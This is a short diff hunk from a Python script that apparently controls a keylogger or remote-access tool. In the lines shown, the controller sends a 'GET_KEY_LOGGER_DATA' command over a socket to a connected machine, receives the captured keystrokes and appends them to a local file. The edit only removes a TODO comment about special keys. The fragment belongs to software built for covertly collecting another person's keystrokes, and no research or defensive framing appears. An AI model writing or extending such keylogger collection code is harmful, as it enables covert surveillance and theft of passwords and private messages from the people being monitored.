@@ -141,7 +141,7 @@ if __name__ == '__main__':
         time.sleep(20)
 
         # get key_logger_data
-        SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA") #TODO: still not working with special keys
+        SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA")
         key_logger_data = SocketManager.receive(conn)
         try:
            with open(KEY_LOGGER_FILE, 'ab') as fp:
